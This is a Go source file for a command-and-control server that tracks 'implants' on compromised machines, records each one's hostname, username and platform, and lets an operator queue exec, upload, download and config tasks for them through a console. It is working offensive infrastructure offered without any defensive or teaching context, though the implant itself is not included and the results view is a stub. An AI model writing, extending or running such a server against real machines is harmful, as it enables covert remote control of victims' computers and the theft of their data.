package main

import (
	"bufio"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ============================================================
// Data structures
// ============================================================

// Client represents a connected implant.
type Client struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	Platform  string    `json:"platform"`
	LastSeen  time.Time `json:"last_seen"`
	FirstSeen time.Time `json:"first_seen"`
	BeaconInt int       `json:"beacon_interval"` // seconds
}

// Command is a task queued for a client.
type Command struct {
	ID       string `json:"id"`
	Type     string `json:"type"`    // exec, upload, download, config
	Payload  string `json:"payload"` // the command args
	Status   string `json:"status"`  // pending, delivered, completed, failed
	Result   string `json:"result,omitempty"`
	IssuedAt string `json:"issued_at,omitempty"`
}

// ----- API request/responses -----

type BeaconReq struct {
	ClientID string `json:"client_id"`
	Hostname string `json:"hostname,omitempty"`
	Username string `json:"username,omitempty"`
	Platform string `json:"platform,omitempty"`
}

type BeaconResp struct {
	Commands      []Command `json:"commands,omitempty"`
	BeaconInterval int      `json:"beacon_interval,omitempty"`
}

type ResultReq struct {
	ClientID  string `json:"client_id"`
	CommandID string `json:"command_id"`
	Output    string `json:"output"`
	Status    string `json:"status"`
}

// ============================================================
// Global state
// ============================================================

var (
	clients   = make(map[string]*Client)
	clientMu  sync.RWMutex

	// commands maps clientID -> slice of pending/active commands
	pendingCmds = make(map[string][]Command)
	cmdMu       sync.Mutex

	cmdCounter   int
	counterMu    sync.Mutex

	operatorOut = make(chan string, 64) // async output for the operator console
)

func nextCmdID() string {
	counterMu.Lock()
	defer counterMu.Unlock()
	cmdCounter++
	return fmt.Sprintf("cmd_%d", cmdCounter)
}

func now() string {
	return time.Now().UTC().Format(time.RFC3339)
}

// ============================================================
// Helpers
// ============================================================

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hexEncode(b)
}

func hexEncode(b []byte) string {
	const hex = "0123456789abcdef"
	out := make([]byte, len(b)*2)
	for i, v := range b {
		out[i*2] = hex[v>>4]
		out[i*2+1] = hex[v&0x0f]
	}
	return string(out)
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

// ============================================================
// HTTP Handlers — API for the implant
// ============================================================

// POST /api/v1/beacon
func handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}

	var req BeaconReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, 400, map[string]string{"error": "bad request"})
		return
	}
	if req.ClientID == "" {
		writeJSON(w, 400, map[string]string{"error": "client_id required"})
		return
	}

	clientMu.Lock()
	c, exists := clients[req.ClientID]
	if !exists {
		c = &Client{
			ID:        req.ClientID,
			FirstSeen: time.Now().UTC(),
			BeaconInt: 30,
		}
		clients[req.ClientID] = c
		operatorOut <- fmt.Sprintf("[+] New client: %s", req.ClientID)
	}
	c.LastSeen = time.Now().UTC()
	if req.Hostname != "" {
		c.Hostname = req.Hostname
	}
	if req.Username != "" {
		c.Username = req.Username
	}
	if req.Platform != "" {
		c.Platform = req.Platform
	}
	clientMu.Unlock()

	// Collect pending commands for this client
	cmdMu.Lock()
	cmds := pendingCmds[req.ClientID]
	if len(cmds) > 0 {
		pendingCmds[req.ClientID] = nil // clear queue after sending
	}
	cmdMu.Unlock()

	resp := BeaconResp{
		Commands:       cmds,
		BeaconInterval: c.BeaconInt,
	}
	writeJSON(w, 200, resp)
}

// POST /api/v1/result
func handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}

	var req ResultReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, 400, map[string]string{"error": "bad request"})
		return
	}

	operatorOut <- fmt.Sprintf("[>] Result from %s / %s (%s):\n%s",
		req.ClientID, req.CommandID, req.Status, req.Output)

	writeJSON(w, 200, map[string]string{"status": "ok"})
}

// GET /api/v1/health
func handleHealth(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]string{"status": "ok", "time": now()})
}

// ============================================================
// Operator Console
// ============================================================

func operatorUsage() {
	fmt.Println(`
C2 Console Commands
===================
  list                          Show connected clients
  task <client> <type> <args>   Issue command (type: exec|upload|download|config)
  results <client>              Show recent results
  help                          This help
  exit                          Shutdown`)
}

func parseCmd(line string) (ok bool) {
	parts := strings.Fields(line)
	if len(parts) == 0 {
		return false
	}
	switch parts[0] {
	case "help":
		operatorUsage()
	case "list":
		listClients()
	case "task":
		if len(parts) < 4 {
			fmt.Println("usage: task <client> <type> <args...>")
			return false
		}
		issueTask(parts[1], parts[2], strings.Join(parts[3:], " "))
	case "results":
		if len(parts) < 2 {
			fmt.Println("usage: results <client>")
			return false
		}
		showResults(parts[1])
	case "exit", "quit":
		fmt.Println("Shutting down...")
		os.Exit(0)
	default:
		fmt.Printf("unknown command: %s\n", parts[0])
	}
	return true
}

func listClients() {
	clientMu.RLock()
	defer clientMu.RUnlock()

	if len(clients) == 0 {
		fmt.Println("[*] No clients connected")
		return
	}

	// sort for consistent output
	ids := make([]string, 0, len(clients))
	for id := range clients {
		ids = append(ids, id)
	}
	sort.Strings(ids)

	fmt.Printf("\n%-12s %-20s %-12s %-12s %s\n", "CLIENT ID", "HOSTNAME", "USER", "PLATFORM", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 80))
	for _, id := range ids {
		c := clients[id]
		ago := time.Since(c.LastSeen).Truncate(time.Second)
		fmt.Printf("%-12s %-20s %-12s %-12s %s ago\n",
			id, c.Hostname, c.Username, c.Platform, ago)
	}
	fmt.Println()
}

func issueTask(clientID, cmdType, args string) {
	clientMu.RLock()
	_, exists := clients[clientID]
	clientMu.RUnlock()

	if !exists {
		fmt.Printf("[-] Unknown client: %s\n", clientID)
		return
	}

	cmd := Command{
		ID:       nextCmdID(),
		Type:     cmdType,
		Payload:  args,
		Status:   "pending",
		IssuedAt: now(),
	}

	cmdMu.Lock()
	pendingCmds[clientID] = append(pendingCmds[clientID], cmd)
	cmdMu.Unlock()

	fmt.Printf("[+] Command %s queued for %s\n", cmd.ID, clientID)
}

func showResults(clientID string) {
	// This is a placeholder — results come through the operator output stream.
	fmt.Println("[*] Results stream in real-time through the console.")
	fmt.Println("[*] Use 'list' to check client status.")
}

// ============================================================
// Operator output pump — goroutine reads from channel and prints
// ============================================================

func consoleOutputPump() {
	for msg := range operatorOut {
		fmt.Println(msg)
		fmt.Print("> ")
	}
}

// ============================================================
// Main
// ============================================================

func main() {
	port := 8080
	if p := os.Getenv("C2_PORT"); p != "" {
		if v, err := strconv.Atoi(p); err == nil {
			port = v
		}
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/api/v1/beacon", handleBeacon)
	mux.HandleFunc("/api/v1/result", handleResult)
	mux.HandleFunc("/api/v1/health", handleHealth)

	// Start HTTP server
	server := &http.Server{
		Addr:    fmt.Sprintf(":%d", port),
		Handler: mux,
	}

	go func() {
		fmt.Printf("[*] C2 server listening on :%d\n", port)
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("HTTP server error: %v", err)
		}
	}()

	// Start console output pump
	go consoleOutputPump()

	// Handle graceful shutdown
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

	// Operator input loop
	fmt.Println("[*] C2 CDN Fronting Server")
	fmt.Println("[*] Type 'help' for commands")
	fmt.Print("> ")

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		parseCmd(line)
		fmt.Print("> ")
	}

	// Wait for signal or stdin EOF
	<-sig
	fmt.Println("\n[*] Shutting down...")
	server.Close()
}
